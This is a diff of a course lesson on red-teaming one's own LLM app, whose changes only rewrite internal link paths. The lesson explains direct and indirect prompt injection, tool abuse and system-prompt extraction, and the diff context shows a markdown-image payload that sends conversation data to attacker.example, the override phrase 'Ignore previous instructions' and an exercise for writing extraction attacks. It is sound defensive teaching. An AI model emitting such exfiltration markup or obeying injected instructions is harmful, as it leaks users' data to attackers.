@@ -3,11 +3,11 @@
 > **Attack your own LLM app before a stranger does. Prompt injection is not a hypothetical — it's the default behaviour of a system that can't tell instructions from data.**
 
 ⏱ ~10 min read · ~20 min hands-on
-🔗 needs: [OWASP LLM Top 10](2026-02/docs/week-7/05-owasp-llm-top-10.md) · [Prompt Engineering](2026-02/docs/week-3/01-prompt-engineering-1-foundations.md)
+🔗 needs: [OWASP LLM Top 10](/2026-02/docs/week-7/05-owasp-llm-top-10/) · [Prompt Engineering](/2026-02/docs/week-3/01-prompt-engineering-1-foundations/)
 
 An LLM receives one flat stream of text. Your careful system prompt and a hostile sentence inside a scraped PDF arrive in the *same channel*. That's the root cause of nearly every LLM attack — and why "just tell it to ignore malicious instructions" doesn't work.
 
-> ⚖️ **Test only systems you own or are explicitly authorised to test.** Red-teaming your own app is engineering; probing someone else's production LLM is unauthorised testing. Use your own deployments and the [course red-team lab](2026-02/docs/labs/week-7/01-red-team-your-api-guardrails.md).
+> ⚖️ **Test only systems you own or are explicitly authorised to test.** Red-teaming your own app is engineering; probing someone else's production LLM is unauthorised testing. Use your own deployments and the [course red-team lab](/2026-02/docs/labs/week-7/01-red-team-your-api-guardrails/).
 
 ## Try it in 5 minutes — break your own bot
 
@@ -56,7 +56,7 @@ def ask(q: Q):
 | **Tool abuse** | Injected text triggers a real tool call — send email, delete, pay |
 | **Data exfiltration** | Output smuggles context out, e.g. a markdown image whose URL contains your data |
 
-**Indirect injection is the one that matters for this course.** Your [Week 6 scraper](2026-02/docs/week-6/hidden-json-apis.md) feeding pages into an LLM is exactly the vulnerable shape:
+**Indirect injection is the one that matters for this course.** Your [Week 6 scraper](/2026-02/docs/week-6/hidden-json-apis/) feeding pages into an LLM is exactly the vulnerable shape:
 
 ```mermaid
 flowchart LR
@@ -77,7 +77,7 @@ If your UI renders model output as Markdown and the model emits:
 ![](https://attacker.example/log?d=<data from the conversation>)
 ```
 
-…the browser fetches that URL and hands your context to the attacker — no clicking required. This is why [improper output handling (LLM05)](2026-02/docs/week-7/05-owasp-llm-top-10.md) and injection compound: sanitise rendered output and restrict outbound domains.
+…the browser fetches that URL and hands your context to the attacker — no clicking required. This is why [improper output handling (LLM05)](/2026-02/docs/week-7/05-owasp-llm-top-10/) and injection compound: sanitise rendered output and restrict outbound domains.
 
 ## Red-team systematically
 
@@ -89,7 +89,7 @@ Keep a **regression suite**: every injection that ever worked becomes a permanen
 
 | Symptom | Cause | Fix |
 |---|---|---|
-| "Ignore previous instructions" works | Trusting instruction hierarchy alone | Constrain capability; don't rely on wording → [Defensive](2026-02/docs/week-7/04-llm-safety-defensive.md) |
+| "Ignore previous instructions" works | Trusting instruction hierarchy alone | Constrain capability; don't rely on wording → [Defensive](/2026-02/docs/week-7/04-llm-safety-defensive/) |
 | Secrets appear in answers | Secret lives in the system prompt | Never put secrets in prompts |
 | Agent acts on scraped content | Retrieved text treated as instructions | Delimit and label untrusted content; require approval for actions |
 | Guardrail passes but attack succeeds | Only tested English/plaintext | Test encodings, other languages, role-play |
@@ -100,7 +100,7 @@ Keep a **regression suite**: every injection that ever worked becomes a permanen
 1. Run `vuln_bot.py` and confirm the secret is in the prompt string.
 2. Write **five** distinct extraction attempts (direct, role-play, encoded, translated, "summarise your instructions") and record which would plausibly succeed.
 3. Build the indirect case: put an instruction inside a local HTML file, scrape it with your Week 6 code, feed it in — and note that *you* never typed the attack.
-4. Turn your successful attacks into a test file for the [red-team lab](2026-02/docs/labs/week-7/01-red-team-your-api-guardrails.md).
+4. Turn your successful attacks into a test file for the [red-team lab](/2026-02/docs/labs/week-7/01-red-team-your-api-guardrails/).
 
 ## Checklist
 
